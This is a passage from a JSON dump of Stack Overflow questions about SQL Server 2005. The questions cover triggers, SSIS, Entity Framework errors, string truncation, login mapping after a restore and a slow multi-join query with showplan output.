&lt;\n1           THERMI  NULL      NULL     1\n....... more rows ...\n</code></pre>\n\n<p>To be more clear i try to explode the SQL required in many queries as:</p>\n\n<pre><code>Select Field1, ... from SELLDATA \nwhere IDIncentive=1 and CdMarca='DELONG' and CdSettore=10 and CdGruppo='0024'\nUNION ALL\nSelect Field1, ... from SELLDATA \nwhere IDIncentive=1 and CdMarca='SILE' and CdSettore=10 and CdGruppo='0012'\nUNION ALL\nSelect Field1, ... from SELLDATA \nwhere IDIncentive=1 and CdMarca='SILE' and CdSettore=11 and CdGruppo='0025'\n</code></pre>\n\n<p>As u can imagine i cant do that because the conditions change daily by the customer so my question is:</p>\n\n<p><strong>How i can create a select that have all the conditions (as my example above) to use in the cursor ? There are a way ?</strong></p>\n\n<p>Thanks for who can help me and please advise if need more information to make more clear this question</p>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":599,"score":0,"question_id":10843817,"title":"Trigger in SQL Server - Get the type of Transaction done for Audit Table","body":"<p>I am writing trigger for inserting records into my <code>Audit</code> table.</p>\n\n<p>Whenever there is a change in data in my target table, the trigger will update the old value, new value to the audit table</p>\n\n<p>Additionally there are columns called <code>Transaction</code> and <code>Transaction_Status</code></p>\n\n<p><code>Transaction</code> column defines the type of transaction. Can be <code>INSERT</code>, <code>UPDATE</code> or <code>DELETE</code>.<br>\n<code>Transaction_Status</code> column indicates <code>SUCCESS</code> or <code>FAILURE</code></p>\n\n<p>How to achieve this ?</p>\n\n<p>My trigger : </p>\n\n<pre><code>Alter Trigger TR_test\nON subscribers\nFOR UPDATE\nAS BEGIN\nDECLARE @OldValue xml,@NewValue xml, @changedby varchar(50), @ReferenceId int\n-----------------------------------------------------------------------------\nSELECT @OldValue=b.username, @NewValue=a.username, \n       @ReferenceId = a.user_id, @changedby = a.modified_by\nFROM inserted a, deleted b;\n----------------------------------------------------------------------------- \nINSERT INTO [dbo].[audit_log]\n           ([old_value],[new_value],[module],[reference_id],[transaction]\n           ,[transaction_status],[stack_trace],[modified_on],[modified_by])\n     VALUES\n(@OldValue,@NewValue,'Subscriber',@ReferenceId,'_transaction',\n'_transaction_status','_stack_trace',getdate(),555)\n\n-----------------------------------------------------------------------------\nEND\n</code></pre>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":10849918,"title":"SSIS Package - Child packages are not getting executed","body":"<p>We have multiple Staging, Dimension, Fact packages - which were all running fine recently.</p>\n\n<p>But from yesterday in Facts process - child packages are not getting executed from Parent. It invokes child package, but none of the task in CHILD gets executed, it just gets STUCK.</p>\n\n<p>We havent made any changes to packages. But when I run child packages individually they work perfectly fine.</p>\n\n<p>Is this a SSIS bug?</p>\n\n<p>Regards</p>\n"},{"tags":["c#","wcf","sql-server-2008","sql-server-2005","entity-framework-4"],"answer_count":2,"favorite_count":0,"up_vote_count":10,"down_vote_count":0,"view_count":727,"score":10,"question_id":10542055,"title":"The specified cast from a materialized 'System.Guid' type to the 'System.Int32' type is not valid","body":"<p><code>The specified cast from a materialized 'System.Guid' type to the 'System.Int32' type is not valid.</code></p>\n\n<p>We have several WCF services that have concurrency mode of Multiple and <code>InstanceContextMode</code> of Single. Our architecture focuses on a loosely coupled model using constructor-based dependency injection. This in turn is implemented using Unity 2.0 (web.config of each service has mappings between interfaces and types defined in a unity container section). One of our dependencies is a DAL assembly (data access layer) that uses Entity Framework 4 to communicate with MSSql Server. The classes that do the talking to the database are also included in the unity mapping.</p>\n\n<p>Everything is great when we run our integration tests. But when we move to our performance environment to run load tests (2, 3, 4 concurrent users) we start seeing the following error:</p>\n\n<p><code>System.InvalidOperationException: The 'auth_token' property on 'Session' could not be set to a 'Int32' value. You must set this property to a non-null value of type 'Guid'.</code></p>\n\n<p>With the following stack:</p>\n\n<pre><code>at System.Data.Common.Internal.Materialization.Shaper.ErrorHandlingValueReader`1.GetValue(DbDataReader reader, Int32 ordinal)\nat System.Data.Common.Internal.Materialization.Shaper.GetPropertyValueWithErrorHandling[TProperty](Int32 ordinal, String propertyName, String typeName)\nat lambda_method(Closure , Shaper )\nat System.Data.Common.Internal.Materialization.Shaper.HandleEntityAppendOnly[TEntity](Func`2 constructEntityDelegate, EntityKey entityKey, EntitySet entitySet)\nat lambda_method(Closure , Shaper )\nat System.Data.Common.Internal.Materialization.Coordinator`1.ReadNextElement(Shaper shaper)\nat System.Data.Common.Internal.Materialization.Shaper`1.SimpleEnumerator.MoveNext()\nat System.Linq.Enumerable.First[TSource](IEnumerable`1 source)\nat System.Linq.Queryable.First[TSource](IQueryable`1 source)\nat MISoa.DataAccessLayer.Authentication.AuthenticationDB.RetrieveSession(Guid authToken)\nat MISoa.DataAccessLayer.Authentication.AuthenticationAccess.RetrieveSession(String sessionToken)\n</code></pre>\n\n<p>Here is the culprit method:</p>\n\n<pre><code>public Session RetrieveSession(Guid authToken)\n    {\n        CheckDBContext();\n        var sessions = (from r in _dbContext.Sessions\n                where r.auth_token == authToken\n                select r);\n        return sessions.Count() &gt; 0 ? sessions.First() : null;\n    }\n</code></pre>\n\n<p><code>CheckDBContext</code> method simply checks if the db context is null and, if it is, it throws a custom exception.</p>\n\n<p>The emdx Session entity object has these public properties:</p>\n\n<pre><code>Guid auth_token\nDateTime time_stamp\nString user_id\nString app_id\n</code></pre>\n\n<p>So, it looks like sometimes the above linq returns some other object from the database where the first column is an <code>int</code> and not a <code>guid</code>? And if so - why? Do I have a problem with multiple threads overriding each other's db context? BTW - we abstracted the code that instantiates the db context to a separate class (BaseDB) which is also handled by unity. So, because the service is a singleton I have one instance of BaseDB for everyone, right? Is this the problem here?</p>\n\n<p>Oh, one more thing. We were told that we will have MSSql 2005 so in the edmx file we have <code>ProviderManifestToken=\"2005\"</code>. But I just checked and the server with our performance database is version 2008. Is this a problem?</p>\n\n<p>Thank you for your help.</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":10846278,"title":"Transfer content of email to C# page","body":"<p>I have created one web-form that contains controls to add name, date of birth, gender info of user with add button, once add button clicked that info goes to database.\nBut i have my mailbox, for eg. gmail some mails are coming in inbox that contains info same as earlier(Name, Date of birth, gender etc.). So can i have functionality to transfer that inbox data to my database?</p>\n"},{"tags":["sql","sql-server-2005","delete"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":10837350,"title":"How to delete with these conditions?","body":"<p>How can I delete rows which meet several conditions from a table without primary key?(actually the primary key is formed by every column)</p>\n\n<p>After so many tries I have a code that first creates a temporary table where it inserts the rows I want to delete and finally I try to delete the rows from original table which meet the conditions comparing to temporary table.</p>\n\n<p>But it gives me the error about cannot linking the several parts identifier #temp.idCarga</p>\n\n<p>Maybe it's easy but I have been trying so much time and I cannot focus properly.</p>\n\n<pre><code>CREATE TABLE #TEMP \n(\n    CC int,\n    idCarga int, \n    Tipo nvarchar(50),\n    Importe float,\n    Bloque nvarchar(50),\n    idsistema int\n)\n\nINSERT INTO #TEMP(CC,idCarga,Importe,Bloque,Tipo,IdSistema)\nselect distinct CI.CC,CI.idCarga,CI.Importe,CI.Bloque,CI.Tipo,CI.idSistema\nfrom CONT_INGRESOS_InformeMayor CI\nINNER JOIN \n(\n    SELECT idCarga,CC,Bloque,Importe,TIpo\n    FROM CONT_INGRESOS_InformeMayor\n) CI2 \n    ON CI.CC = CI2.CC \n    AND CI.Bloque = CI2.Bloque \n    AND CI.TIpo &lt;&gt; CI2.Tipo\nWHERE CI.idCarga = @idCarga \n    AND CI2.idCarga = @idCarga \n    AND CI.Importe = 0\n\nDELETE \nFROM CONT_INGRESOS_InformeMayor \nWHERE idCarga = #temp.idCarga \n    AND tipo = #temp.tipo \n    AND importe = #temp.importe \n    and bloque = #temp.bloque\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":672,"score":0,"question_id":10843567,"title":"SQL Server Error : String or binary data would be truncated","body":"<p>My table :</p>\n\n<pre><code>log_id                 bigint\nold_value                  xml\nnew_value                  xml\nmodule                 varchar(50)\nreference_id           bigint\n[transaction]          varchar(100)\ntransaction_status         varchar(10)\nstack_trace                ntext\nmodified_on                datetime\nmodified_by                bigint\n</code></pre>\n\n<p>Insert Query :</p>\n\n<pre><code>INSERT INTO [dbo].[audit_log]\n           ([old_value],[new_value],[module],[reference_id],[transaction]\n           ,[transaction_status],[stack_trace],[modified_on],[modified_by])\n     VALUES\n            ('asdf','asdf','Subscriber',4,'_transaction',\n            '_transaction_status','_stack_trace',getdate(),555)\n</code></pre>\n\n<p>Error : </p>\n\n<pre><code>Msg 8152, Level 16, State 14, Line 1\nString or binary data would be truncated.\nThe statement has been terminated.\n</code></pre>\n\n<p>Why is that ???</p>\n"},{"tags":["sql-server","performance","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":10840781,"title":"SQL Server 2005 Performance Issues and Testing","body":"<p>I have statistical math functions that use intense sql queries and run in an sql assembly.  I just increased the RAM on my db server (IIS 6, SQL Server 2005) but my queries still suck up 100% of my CPU for the 5 minutes I allow for the assemblies to run.  Is there any way to allow the assemblies to cap their CPU? At 100% the server becomes unresponsive. Any sql tuning would help too.</p>\n"}]}
{"total":14387,"page":19,"pagesize":100,"questions":[{"tags":["sql-server-2005","reporting-services"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":243,"score":1,"question_id":10838974,"title":"SQL Server 2005 Report Manager - data source connection info deleted?","body":"<p>Just started a new job and one of my duties is to create/alter reports and make them accessible on our report server for the rest of the company.  I've created a new report (from an existing report) in Visual Studio 2005 and it works fine in VS.  After I Upload the file to the report server using Microsoft SQL Server Report Manager and try to view the report it says \"The report server cannot process the report. The data source connection information has been deleted. (rsInvalidDataSourceReference)\"</p>\n\n<p>I checked in Properties > Data Sources and the first option \"A shared data source\" is selected with a alert next to it saying \"The shared data source reference is no longer valid\".  The odd thing is that the original report that I used to create this one has the same alert and same settings, but it executes fine. They are very similar - original reports by year and the new one is by month.</p>\n\n<p>I'd really appreciate any help i can get on this one as I don't have anyone in the company I can lean on.  I'm very unfamiliar with these applications so it could be that I just need some basic first steps to troubleshoot this issue.</p>\n"},{"tags":["sql","sql-server-2005","select"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":127,"score":1,"question_id":10840182,"title":"Can you select the Nth row in the dataset returned by SELECT statement?","body":"<p>In pseudo-code, what I mean is, can you do something like this (similar to TOP):</p>\n\n<pre><code>SELECT Row 2\n*\nFROM Table\nWHERE Column1 = Condition\n</code></pre>\n\n<p>I wanted to do something for testing - I can't think of a real world scenario for this. Just curious if it's possible. I can't find anything on the Interwebz about it. </p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":266,"score":0,"question_id":10838660,"title":"Returning multiple values in a CASE expression","body":"<p>I have an outdated stored procedure that looks something like:</p>\n\n<pre><code>CASE\n      WHEN (org.org_misc_data = 'PAC') THEN 'pac'\n      WHEN (org.dues_category = 'PART') THEN 'partner_member'\n      WHEN (org.dues_category = 'FREE' AND org.org_status_flag = 'P') THEN 'associate_member'\n      ELSE 'non_member'\nEND AS org_status\n</code></pre>\n\n<p>The way it it currently written, as soon as it hits the first <code>WHEN</code> clause, my <code>org_status</code> value would be \"pac\". Can someone direct me how to re-write this so that <code>org_status</code> can contain return multiple values (ie: \"pac|partner_member\").</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":7359,"score":4,"question_id":867986,"title":"Linking Users to Login after restoring a SQL Server 2005 database","body":"<p>I wish to move a database between two servers, I have backed the database up from the first server and done a database restore on the 2nd server, so far so good.</p>\n\n<p>However our application make use of a lot of database users that are defined in the database, these have to be linked to logins that are defined in the master database.  The server I have restored the database to has all the login defined, however they have different sids.</p>\n\n<p>I am not a TSQL expert.</p>\n\n<p>I think sp_change_users_login is part of the solution, but I cant findout to get it to automatically link <strong>all</strong> users in the restored database to the login of the same name.  </p>\n\n<p>The database creation scripts we use for our application create the users and logins, however it does not specify the SID when creating the login, hence this problem.  Now if I had a time machine</p>\n\n<p>(When I Google I get lots of hits, however they are mostly sites that want let you see the answer without having to register on the site first)  </p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":114,"score":2,"question_id":10822611,"title":"Adding one more join kills performance","body":"<p>We have a fairly complex query on SQL Server 2005 with these characteristics:</p>\n\n<ul>\n<li>11 table joins</li>\n<li>8 view joins</li>\n<li>7 non-correlated query joins</li>\n</ul>\n\n<p>All of the joins have a common indexed column.</p>\n\n<p>It normally runs in under 30 seconds, but when adding one more table join (the joined column indexed), it runs seemingly forever.</p>\n\n<p>I noticed that if I remove one particular existing view join, it runs fast again even with the new join.</p>\n\n<p>Below is a modified version of the query with most joins removed but it still demonstrates the performance issue.</p>\n\n<pre><code>--This runs super slow\nSELECT \n    L.LoanID    \nFROM  dbo.Loan L \n    JOIN dbo.Company C ON c.CompanyKey = l.CompanyKey\n    JOIN dbo.Status S  on L.LoanID = S.LoanID\n    JOIN dbo.Participation P on L.LoanID = P.LoanID\n    JOIN dbo.Delinquent D on  L.LoanID = D.LoanID\n    JOIN dbo.Property Pr on Pr.Loanid = L.Loanid\n    JOIN dbo.MailingAddress ma ON ma.LoanID = L.LoanID  \n    LEFT JOIN dbo.BorrowerPhonePivot bp ON bp.loanid = l.loanid\nWHERE s.primstat=1 AND  DATEADD(d,16,L.DueDate) &lt;= C.TransPostDate\n\n\n--This runs fast\n SELECT \n    L.LoanID    \n FROM  dbo.Loan L \n    JOIN dbo.Company C ON c.CompanyKey = l.CompanyKey\n    JOIN dbo.Status S  on L.LoanID = S.LoanID\n    JOIN dbo.Participation P on L.LoanID = P.LoanID\n    JOIN dbo.Delinquent D on  L.LoanID = D.LoanID\n    JOIN dbo.Property Pr on Pr.Loanid = L.Loanid\n    --JOIN dbo.MailingAddress ma ON ma.LoanID = L.LoanID    \n    LEFT JOIN dbo.BorrowerPhonePivot bp ON bp.loanid = l.loanid\n WHERE s.primstat=1 AND  DATEADD(d,16,L.DueDate) &lt;= C.TransPostDate\n\n\n --This runs fast\n SELECT \n    L.LoanID    \n FROM  dbo.Loan L \n    JOIN dbo.Company C ON c.CompanyKey = l.CompanyKey\n    JOIN dbo.Status S  on L.LoanID = S.LoanID\n    JOIN dbo.Participation P on L.LoanID = P.LoanID\n    JOIN dbo.Delinquent D on  L.LoanID = D.LoanID\n    JOIN dbo.Property Pr on Pr.Loanid = L.Loanid\n    JOIN dbo.MailingAddress ma ON ma.LoanID = L.LoanID  \n    --LEFT JOIN dbo.BorrowerPhonePivot bp ON bp.loanid = l.loanid\n WHERE s.primstat=1 AND  DATEADD(d,16,L.DueDate) &lt;= C.TransPostDate\n</code></pre>\n\n<p>This problem isn't specific to this query as I have encountered this bizarre behavior before in other queries and have never been able to fully solve it. My theory is that SQL Server is hitting an internal query plan limit and goes stupid. </p>\n\n<p>I filtered the query to one state (returned one record but took 10 minutes) in order to generate recommendations via the DTA. I added some needed indexes without any difference. </p>\n\n<p>I examined the execution plan results but didn't find anything out of the ordinary.</p>\n\n<p>Any suggestions on what else to look for?</p>\n\n<p><strong>This is what I have tried:</strong></p>\n\n<ul>\n<li>DTA - added one needed index out of 4 generated recommendations. (others are already covered)</li>\n<li>MAXDOP 1 to see if it is threading issue per @AaronBertrand</li>\n<li>UPDATE STATISTICS on tables per @AaronBertrand</li>\n<li>Ran sqlplan (<a href=\"http://pastebin.com/4k0mr9Sz\" rel=\"nofollow\">pastebin</a>) in SQL sentry plan explorer per @AaronBertrand. The strange this is that the <strong>Actual Rows column shows a number that is an order of magnitude larger</strong> than reality. Somehow the query plan optimizer is getting confused.</li>\n</ul>\n\n<p><strong>showplan of first query:</strong></p>\n\n<pre><code>  |--Nested Loops(Left Outer Join, OUTER REFERENCES:([L].[LoanID]))\n   |--Nested Loops(Inner Join, WHERE:([Expr1056]&lt;=[Service_Prod].[dbo].[Company].[TransPostDate] as [C].[TransPostDate]))\n   |    |--Hash Match(Inner Join, HASH:([ma].[LoanID])=([D].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Delinquent].[LoanID] as [D].[LoanID]=[Service_Prod].[dbo].[MailingAddress].[LoanID] as [ma].[LoanID]))\n   |    |    |--Hash Match(Inner Join, HASH:([ma].[LoanID])=([P].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Participation].[LoanID] as [P].[LoanID]=[Service_Prod].[dbo].[MailingAddress].[LoanID] as [ma].[LoanID]))\n   |    |    |    |--Merge Join(Inner Join, MERGE:([Pr].[LoanID])=([ma].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Property].[LoanID] as [Pr].[LoanID]=[Service_Prod].[dbo].[MailingAddress].[LoanID] as [ma].[LoanID]))\n   |    |    |    |    |--Merge Join(Inner Join, MERGE:([Pr].[LoanID])=([L].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Loan].[LoanID] as [L].[LoanID]=[Service_Prod].[dbo].[Property].[LoanID] as [Pr].[LoanID]))\n   |    |    |    |    |    |--Merge Join(Inner Join, MERGE:([Pr].[LoanID])=([S].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Status].[LoanID] as [S].[LoanID]=[Service_Prod].[dbo].[Property].[LoanID] as [Pr].[LoanID]))\n   |    |    |    |    |    |    |--Index Scan(OBJECT:([Service_Prod].[dbo].[Property].[aaaaaProperty_PK] AS [Pr]), ORDERED FORWARD)\n   |    |    |    |    |    |    |--Index Seek(OBJECT:([Service_Prod].[dbo].[Status].[_dta_index_Status_114_1122103038__K13_K1_K2_K3] AS [S]), SEEK:([S].[PrimStat]=(1)) ORDERED FORWARD)\n   |    |    |    |    |    |--Compute Scalar(DEFINE:([Expr1056]=dateadd(day,(16),[Service_Prod].[dbo].[Loan].[DueDate] as [L].[DueDate])))\n   |    |    |    |    |         |--Index Scan(OBJECT:([Service_Prod].[dbo].[Loan].[_dta_index_Loan_K1_K66_K10_K23] AS [L]), ORDERED FORWARD)\n   |    |    |    |    |--Index Scan(OBJECT:([Service_Prod].[dbo].[MailingAddress].[StatusMailingAddress] AS [ma]), ORDERED FORWARD)\n   |    |    |    |--Index Scan(OBJECT:([Service_Prod].[dbo].[Participation].[Reference17] AS [P]))\n   |    |    |--Index Scan(OBJECT:([Service_Prod].[dbo].[Delinquent].[aaaaaDelinquent_PK] AS [D]))\n   |    |--Table Scan(OBJECT:([Service_Prod].[dbo].[Company] AS [C]))\n   |--Stream Aggregate(GROUP BY:([l].[LoanID]))\n        |--Filter(WHERE:([Service_Prod].[dbo].[Loan].[LoanID] as [l].[LoanID]=[Service_Prod].[dbo].[Loan].[LoanID] as [L].[LoanID]))\n             |--Hash Match(Inner Join, HASH:([b].[LoanID], [b].[AssmRecCounter], [b].[BorrowerID])=([bp].[LoanID], [bp].[AssmRecCounter], [bp].[BorrowerID]), RESIDUAL:([Service_Prod].[dbo].[BorrowerPhone].[LoanID] as [bp].[LoanID]=[Service_Prod].[dbo].[Borrower].[LoanID] as [b].[LoanID] AND [Service_Prod].[dbo].[Borrower].[AssmRecCounter] as [b].[AssmRecCounter]=[Service_Prod].[dbo].[BorrowerPhone].[AssmRecCounter] as [bp].[AssmRecCounter] AND [Service_Prod].[dbo].[Borrower].[BorrowerID] as [b].[BorrowerID]=[Service_Prod].[dbo].[BorrowerPhone].[BorrowerID] as [bp].[BorrowerID]))\n                  |--Hash Match(Inner Join, HASH:([Service_Prod].[dbo].[Company].[CompanyKey])=([l].[CompanyKey]))\n                  |    |--Index Scan(OBJECT:([Service_Prod].[dbo].[Company].[aaaaaCompany_PK]))\n                  |    |--Merge Join(Inner Join, MERGE:([s].[LoanID])=([b].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Status].[LoanID] as [s].[LoanID]=[Service_Prod].[dbo].[Borrower].[LoanID] as [b].[LoanID]))\n                  |         |--Index Seek(OBJECT:([Service_Prod].[dbo].[Status].[_dta_index_Status_114_1122103038__K13_K1_K2_K3] AS [s]), SEEK:([s].[PrimStat]=(1)) ORDERED FORWARD)\n                  |         |--Merge Join(Inner Join, MERGE:([l].[LoanID])=([b].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Loan].[LoanID] as [l].[LoanID]=[Service_Prod].[dbo].[Borrower].[LoanID] as [b].[LoanID] AND [Service_Prod].[dbo].[Loan].[AssmRecCounter] as [l].[AssmRecCounter]=[Service_Prod].[dbo].[Borrower].[AssmRecCounter] as [b].[AssmRecCounter]))\n                  |              |--Index Scan(OBJECT:([Service_Prod].[dbo].[Loan].[_dta_index_Loan_K1_K66_K10_K23] AS [l]), ORDERED FORWARD)\n                  |              |--Index Scan(OBJECT:([Service_Prod].[dbo].[Borrower].[aaaaaBorrower_PK] AS [b]), ORDERED FORWARD)\n                  |--Index Seek(OBJECT:([Service_Prod].[dbo].[BorrowerPhone].[_dta_index_BorrowerPhone_K12_K1_K2_K3_K5] AS [bp]), SEEK:([bp].[ForeignPhone]=(0)),  WHERE:([Service_Prod].[dbo].[BorrowerPhone].[PhoneType] as [bp].[PhoneType]=(0) OR [Service_Prod].[dbo].[BorrowerPhone].[PhoneType] as [bp].[PhoneType]=(1)) ORDERED FORWARD)\n</code></pre>\n\n<p>showplan of 2nd query:</p>\n\n<pre><code>  |--Parallelism(Gather Streams)\n   |--Hash Match(Left Outer Join, HASH:([L].[LoanID])=([l].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Loan].[LoanID] as [l].[LoanID]=[Service_Prod].[dbo].[Loan].[LoanID] as [L].[LoanID]))\n        |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([L].[LoanID]))\n        |    |--Hash Match(Inner Join, HASH:([Pr].[LoanID])=([D].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Delinquent].[LoanID] as [D].[LoanID]=[Service_Prod].[dbo].[Property].[LoanID] as [Pr].[LoanID]))\n        |         |--Bitmap(HASH:([Pr].[LoanID]), DEFINE:([Bitmap1065]))\n        |         |    |--Hash Match(Inner Join, HASH:([Pr].[LoanID])=([P].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Participation].[LoanID] as [P].[LoanID]=[Service_Prod].[dbo].[Property].[LoanID] as [Pr].[LoanID]))\n        |         |         |--Bitmap(HASH:([Pr].[LoanID]), DEFINE:([Bitmap1064]))\n        |         |         |    |--Hash Match(Inner Join, HASH:([S].[LoanID])=([Pr].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Status].[LoanID] as [S].[LoanID]=[Service_Prod].[dbo].[Property].[LoanID] as [Pr].[LoanID]))\n        |         |         |         |--Bitmap(HASH:([S].[LoanID]), DEFINE:([Bitmap1063]))\n        |         |         |         |    |--Hash Match(Inner Join, HASH:([S].[LoanID])=([L].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Loan].[LoanID] as [L].[LoanID]=[Service_Prod].[dbo].[Status].[LoanID] as [S].[LoanID]))\n        |         |         |         |         |--Bitmap(HASH:([S].[LoanID]), DEFINE:([Bitmap1062]))\n        |         |         |         |         |    |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([S].[LoanID]))\n        |         |         |         |         |         |--Index Seek(OBJECT:([Service_Prod].[dbo].[Status].[IDX_Status_PrimStat_INCLoanID] AS [S]), SEEK:([S].[PrimStat]=(1)) ORDERED FORWARD)\n        |         |         |         |         |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([L].[LoanID]), WHERE:(PROBE([Bitmap1062],[Service_Prod].[dbo].[Loan].[LoanID] as [L].[LoanID])))\n        |         |         |         |              |--Nested Loops(Inner Join, WHERE:([Expr1053]&lt;=[Service_Prod].[dbo].[Company].[TransPostDate] as [C].[TransPostDate]))\n        |         |         |         |                   |--Parallelism(Distribute Streams, RoundRobin Partitioning)\n        |         |         |         |                   |    |--Table Scan(OBJECT:([Service_Prod].[dbo].[Company] AS [C]))\n        |         |         |         |                   |--Compute Scalar(DEFINE:([Expr1053]=dateadd(day,(16),[Service_Prod].[dbo].[Loan].[DueDate] as [L].[DueDate])))\n        |         |         |         |                        |--Index Scan(OBJECT:([Service_Prod].[dbo].[Loan].[_dta_index_Loan_K1_K66_K10_K23] AS [L]))\n        |         |         |         |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([Pr].[LoanID]))\n        |         |         |              |--Index Scan(OBJECT:([Service_Prod].[dbo].[Property].[aaaaaProperty_PK] AS [Pr]),  WHERE:(PROBE([Bitmap1063],[Service_Prod].[dbo].[Property].[LoanID] as [Pr].[LoanID])))\n        |         |         |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([P].[LoanID]))\n        |         |              |--Index Scan(OBJECT:([Service_Prod].[dbo].[Participation].[Reference17] AS [P]),  WHERE:(PROBE([Bitmap1064],[Service_Prod].[dbo].[Participation].[LoanID] as [P].[LoanID])))\n        |         |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([D].[LoanID]))\n        |              |--Index Scan(OBJECT:([Service_Prod].[dbo].[Delinquent].[aaaaaDelinquent_PK] AS [D]),  WHERE:(PROBE([Bitmap1065],[Service_Prod].[dbo].[Delinquent].[LoanID] as [D].[LoanID])))\n        |--Stream Aggregate(GROUP BY:([l].[LoanID]))\n             |--Sort(ORDER BY:([l].[LoanID] ASC))\n                  |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([l].[LoanID]))\n                       |--Hash Match(Inner Join, HASH:([b].[LoanID], [b].[AssmRecCounter], [b].[BorrowerID])=([bp].[LoanID], [bp].[AssmRecCounter], [bp].[BorrowerID]), RESIDUAL:([Service_Prod].[dbo].[BorrowerPhone].[LoanID] as [bp].[LoanID]=[Service_Prod].[dbo].[Borrower].[LoanID] as [b].[LoanID] AND [Service_Prod].[dbo].[Borrower].[AssmRecCounter] as [b].[AssmRecCounter]=[Service_Prod].[dbo].[BorrowerPhone].[AssmRecCounter] as [bp].[AssmRecCounter] AND [Service_Prod].[dbo].[Borrower].[BorrowerID] as [b].[BorrowerID]=[Service_Prod].[dbo].[BorrowerPhone].[BorrowerID] as [bp].[BorrowerID]))\n                            |--Bitmap(HASH:([b].[LoanID], [b].[AssmRecCounter], [b].[BorrowerID]), DEFINE:([Bitmap1068]))\n                            |    |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([b].[LoanID], [b].[AssmRecCounter], [b].[BorrowerID]))\n                            |         |--Hash Match(Inner Join, HASH:([s].[LoanID], [l].[AssmRecCounter])=([b].[LoanID], [b].[AssmRecCounter]), RESIDUAL:([Service_Prod].[dbo].[Status].[LoanID] as [s].[LoanID]=[Service_Prod].[dbo].[Borrower].[LoanID] as [b].[LoanID] AND [Service_Prod].[dbo].[Loan].[AssmRecCounter] as [l].[AssmRecCounter]=[Service_Prod].[dbo].[Borrower].[AssmRecCounter] as [b].[AssmRecCounter]))\n                            |              |--Bitmap(HASH:([s].[LoanID], [l].[AssmRecCounter]), DEFINE:([Bitmap1067]))\n                            |              |    |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([s].[LoanID], [l].[AssmRecCounter]))\n                            |              |         |--Hash Match(Inner Join, HASH:([Service_Prod].[dbo].[Company].[CompanyKey])=([l].[CompanyKey]))\n                            |              |              |--Parallelism(Distribute Streams, Broadcast Partitioning)\n                            |              |              |    |--Index Scan(OBJECT:([Service_Prod].[dbo].[Company].[aaaaaCompany_PK]))\n                            |              |              |--Hash Match(Inner Join, HASH:([s].[LoanID])=([l].[LoanID]), RESIDUAL:([Service_Prod].[dbo].[Loan].[LoanID] as [l].[LoanID]=[Service_Prod].[dbo].[Status].[LoanID] as [s].[LoanID]))\n                            |              |                   |--Bitmap(HASH:([s].[LoanID]), DEFINE:([Bitmap1066]))\n                            |              |                   |    |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([s].[LoanID]))\n                            |              |                   |         |--Index Seek(OBJECT:([Service_Prod].[dbo].[Status].[IDX_Status_PrimStat_INCLoanID] AS [s]), SEEK:([s].[PrimStat]=(1)) ORDERED FORWARD)\n                            |              |                   |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([l].[LoanID]))\n                            |              |                        |--Index Scan(OBJECT:([Service_Prod].[dbo].[Loan].[_dta_index_Loan_K1_K66_K10_K23] AS [l]),  WHERE:(PROBE([Bitmap1066],[Service_Prod].[dbo].[Loan].[LoanID] as [l].[LoanID])))\n                            |              |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([b].[LoanID], [b].[AssmRecCounter]))\n                            |                   |--Index Scan(OBJECT:([Service_Prod].[dbo].[Borrower].[aaaaaBorrower_PK] AS [b]),  WHERE:(PROBE([Bitmap1067],[Service_Prod].[dbo].[Borrower].[LoanID] as [b].[LoanID],[Service_Prod].[dbo].[Borrower].[AssmRecCounter] as [b].[AssmRecCounter])))\n                            |--Parallelism(Repartition Streams, Hash Partitioning, PARTITION COLUMNS:([bp].[LoanID], [bp].[AssmRecCounter], [bp].[BorrowerID]))\n                                 |--Index Seek(OBJECT:([Service_Prod].[dbo].[BorrowerPhone].[_dta_index_BorrowerPhone_K12_K1_K2_K3_K5] AS [bp]), 